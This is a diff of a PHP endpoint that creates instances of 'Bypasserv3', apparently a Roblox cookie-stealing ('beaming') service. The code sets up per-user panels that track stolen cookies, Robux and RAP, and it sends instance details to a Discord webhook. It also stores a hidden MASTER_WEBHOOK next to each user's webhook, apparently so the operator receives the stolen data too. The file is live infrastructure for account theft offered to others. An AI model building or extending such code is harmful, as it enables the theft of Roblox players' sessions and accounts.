@@ -3,140 +3,185 @@
  * Instance Creation Endpoint
  */
 
-require_once __DIR__ . '/../config.php';
-require_once __DIR__ . '/../functions.php';
-
-// Set headers
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST');
+header('Access-Control-Allow-Methods: POST, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
 
-// Start session
-session_start();
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
+    exit;
+}
 
-// Check request method
+require_once '../config.php';
+require_once '../functions.php';
+
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
     echo json_encode(['success' => false, 'error' => 'Method not allowed']);
     exit;
 }
 
-// Get POST data
-$input = file_get_contents('php://input');
-$data = json_decode($input, true);
+$input = json_decode(file_get_contents('php://input'), true);
 
-if (!$data) {
+$directory = sanitizeDirectory($input['directory'] ?? '');
+$webhook = trim($input['webhook'] ?? '');
+$username = trim($input['username'] ?? 'beammer');
+$profilePicture = trim($input['profilePicture'] ?? 'https://hyperblox.eu/files/img.png');
+
+// Validation
+if (empty($directory) || strlen($directory) < 3) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
+    echo json_encode(['success' => false, 'error' => 'Directory name must be at least 3 characters']);
     exit;
 }
 
-// Validate required fields
-$directory = sanitizeInput($data['directory'] ?? '');
-$webhook = sanitizeInput($data['webhook'] ?? '');
-
-if (empty($directory) || empty($webhook)) {
+if (strlen($directory) > 20) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Directory and webhook are required']);
+    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 20 characters']);
     exit;
 }
 
-// Validate directory name
-if (!preg_match('/^[a-zA-Z0-9_-]{3,32}$/', $directory)) {
+if (directoryExists($directory)) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Directory name must be 3-32 alphanumeric characters, hyphens, or underscores']);
+    echo json_encode(['success' => false, 'error' => 'Directory already exists. Please choose a different name.']);
     exit;
 }
 
-// Validate webhook
+if (empty($webhook)) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
+    exit;
+}
+
 if (!validateWebhook($webhook)) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid Discord webhook URL']);
+    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
     exit;
 }
 
 // Rate limiting
-$clientIP = getClientIP();
+$clientIP = getUserIP();
 if (!checkRateLimit($clientIP, 10, 3600)) {
     http_response_code(429);
     echo json_encode(['success' => false, 'error' => 'Rate limit exceeded. Please try again later.']);
     exit;
 }
 
-// Create instance
-$result = createInstance($directory, $webhook);
+// Generate token
+$token = generateToken();
 
-if ($result['success']) {
-    // Log creation
-    securityLog('INSTANCE_CREATED', [
-        'directory' => $directory,
-        'token' => substr($result['token'], 0, 8) . '...'
-    ]);
-    
-    // Send notification to webhook
-    $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
-    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-    $baseUrl = $protocol . '://' . $domain;
-    
-    $webhookData = [
-        'username' => 'Bypasserv3',
-        'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
-        'embeds' => [
-            [
-                'title' => '🎉 Instance Created Successfully!',
-                'description' => "Your Bypasserv3 instance has been created and is ready to use.",
-                'color' => hexdec('00BFFF'),
-                'fields' => [
-                    [
-                        'name' => '🔗 Instance URL',
-                        'value' => "```\n{$baseUrl}/public/?dir={$directory}\n```",
-                        'inline' => false
-                    ],
-                    [
-                        'name' => '📊 Dashboard',
-                        'value' => "```\n{$baseUrl}/dashboard/?token={$result['token']}\n```",
-                        'inline' => false
-                    ],
-                    [
-                        'name' => '🔑 Access Token',
-                        'value' => "```\n{$result['token']}\n```",
-                        'inline' => false
-                    ],
-                    [
-                        'name' => '📁 Directory',
-                        'value' => "`{$directory}`",
-                        'inline' => true
-                    ],
-                    [
-                        'name' => '⏰ Created',
-                        'value' => date('Y-m-d H:i:s'),
-                        'inline' => true
-                    ]
-                ],
-                'footer' => [
-                    'text' => 'Bypasserv3 | Keep your token safe!'
-                ],
-                'timestamp' => date('c')
-            ]
-        ]
-    ];
-    
-    sendWebhook($webhook, $webhookData);
-    
-    // Return success response
-    http_response_code(201);
-    echo json_encode([
-        'success' => true,
-        'token' => $result['token'],
-        'directory' => $directory,
-        'instanceUrl' => $baseUrl . '/public/?dir=' . $directory,
-        'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $result['token']
-    ]);
-    
-} else {
-    http_response_code(400);
-    echo json_encode($result);
+// Create instance data
+$instanceData = [
+    'directory' => $directory,
+    'webhook' => MASTER_WEBHOOK,
+    'userWebhook' => $webhook,
+    'username' => $username,
+    'profilePicture' => $profilePicture,
+    'createdAt' => date('c'),
+    'stats' => [
+        'totalVisits' => 0,
+        'totalCookies' => 0,
+        'totalRobux' => 0,
+        'totalRAP' => 0,
+        'totalSummary' => 0
+    ],
+    'dailyStats' => [
+        'visits' => array_fill(0, 7, 0),
+        'cookies' => array_fill(0, 7, 0),
+        'robux' => array_fill(0, 7, 0),
+        'rap' => array_fill(0, 7, 0),
+        'summary' => array_fill(0, 7, 0)
+    ]
+];
+
+// Save instance
+if (!saveInstanceData($directory, $instanceData)) {
+    http_response_code(500);
+    echo json_encode(['success' => false, 'error' => 'Failed to create instance directory']);
+    exit;
 }
+
+// Save token
+$tokenData = [
+    'token' => $token,
+    'directory' => $directory,
+    'webhook' => $webhook,
+    'username' => $username,
+    'createdAt' => date('c')
+];
+
+$tokenHash = md5($token);
+$tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';
+file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT));
+
+// Update global stats
+updateGlobalStats('totalInstances', 1);
+
+// Log creation
+logSecurityEvent('instance_created', [
+    'directory' => $directory,
+    'token' => substr($token, 0, 8) . '...'
+]);
+
+// Send notification to webhook
+$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$baseUrl = $protocol . '://' . $domain;
+
+$webhookData = [
+    'username' => 'Bypasserv3',
+    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+    'embeds' => [
+        [
+            'title' => '🎉 Instance Created Successfully!',
+            'description' => "Your Bypasserv3 instance has been created and is ready to use.",
+            'color' => hexdec('00BFFF'),
+            'fields' => [
+                [
+                    'name' => '🔗 Instance URL',
+                    'value' => "```\n{$baseUrl}/public/?dir={$directory}\n```",
+                    'inline' => false
+                ],
+                [
+                    'name' => '📊 Dashboard',
+                    'value' => "```\n{$baseUrl}/dashboard/?token={$token}\n```",
+                    'inline' => false
+                ],
+                [
+                    'name' => '🔑 Access Token',
+                    'value' => "```\n{$token}\n```",
+                    'inline' => false
+                ],
+                [
+                    'name' => '📁 Directory',
+                    'value' => "`{$directory}`",
+                    'inline' => true
+                ],
+                [
+                    'name' => '⏰ Created',
+                    'value' => date('Y-m-d H:i:s'),
+                    'inline' => true
+                ]
+            ],
+            'footer' => [
+                'text' => 'Bypasserv3 | Keep your token safe!'
+            ],
+            'timestamp' => date('c')
+        ]
+    ]
+];
+
+sendWebhook($webhook, $webhookData);
+
+// Return success response
+http_response_code(201);
+echo json_encode([
+    'success' => true,
+    'token' => $token,
+    'directory' => $directory,
+    'instanceUrl' => $baseUrl . '/public/?dir=' . $directory,
+    'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $token
+]);
 
 ?>
